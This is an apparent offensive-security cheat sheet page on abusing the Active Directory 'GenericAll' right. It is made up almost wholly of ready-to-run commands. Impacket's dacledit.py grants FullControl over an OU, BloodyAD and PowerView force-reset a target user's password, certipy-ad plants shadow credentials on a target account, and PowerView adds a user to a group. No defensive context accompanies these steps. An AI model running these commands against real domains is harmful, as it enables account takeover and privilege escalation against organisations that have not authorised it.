---
title: "GenericAll"
date: 2024-7-12
tags: ["GenericAll", "active driectory", "ad", "Windows", "shadow credentials"]
---

---
### Abuse #1: Change target user password

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 0. Install latest impacket (included dacledit.py) \[optional\]

<div>

```bash
git clone https://github.com/fortra/impacket.git
```

```bash
cd impacket
```

```bash
pip3 install .
```

</div>

#### 1. Add Full Control to current user \[optional\]

<div>

```bash
dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=EXAMPLE,DC=COM' -inheritance -action write -rights FullControl
```

</div>

#### 2. Change password

{{< tab set2 tab1 active >}}BloodyAD{{< /tab >}}
{{< tabcontent set2 tab1 >}}

<div>

```bash
python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD>
```

</div>

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView.ps1 

<div>

```powershell
. .\PowerView.ps1
```

</div>

#### 2. Change target user password

<div>

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force 
```

```powershell
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
```

</div>

{{< /tabcontent >}}

<br>

---

### Abuse #2: Get shadow credentials

{{< tab set3 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set3 tab1 >}}

<div>

```bash
sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -k -account <TARGET_USER> -target <DC>
```

</div>

{{< /tabcontent >}}

<br>

---

### Abuse #3 : Add user to group

{{< tab set4 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set4 tab1 >}}

#### 1. Import PowerView.ps1 

<div>

```powershell
. .\PowerView.ps1
```

</div>

#### 2. Create cred object (runas) \[optional\]

<div>

```powershell
$username = "<DOMAIN>\<USER>"
```

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

</div>

#### 2. Add user to group

<div>

```powershell
Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
```

</div>

{{< /tabcontent >}}

<br>